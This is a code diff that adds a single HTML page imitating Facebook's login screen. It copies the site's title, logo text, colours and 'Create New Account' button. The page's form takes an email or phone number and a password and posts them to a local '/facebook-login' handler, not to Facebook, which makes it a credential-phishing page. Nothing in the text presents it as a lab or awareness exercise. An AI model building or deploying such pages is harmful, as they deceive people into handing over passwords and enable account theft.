@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In or Sign Up</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-box {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+        .login-box input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        .login-box button {
+            width: 100%;
+            padding: 10px;
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .login-box button:hover {
+            background-color: #165dbb;
+        }
+        .facebook-header {
+            font-size: 36px;
+            color: #1877f2;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        .login-box a {
+            color: #1877f2;
+            text-decoration: none;
+            display: block;
+            margin-top: 10px;
+        }
+        .login-box a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="facebook-header">Facebook</div>
+            <form id="facebook-login-form" action="/facebook-login" method="post">
+                <input type="text" placeholder="Email or Phone Number" id="fb-username" name="username">
+                <input type="password" placeholder="Password" id="fb-password" name="password">
+                <button type="submit">Log In</button>
+                <a href="#">Forgotten password?</a>
+                <hr>
+                <button type="button" style="background-color: #42b72a;">Create New Account</button>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
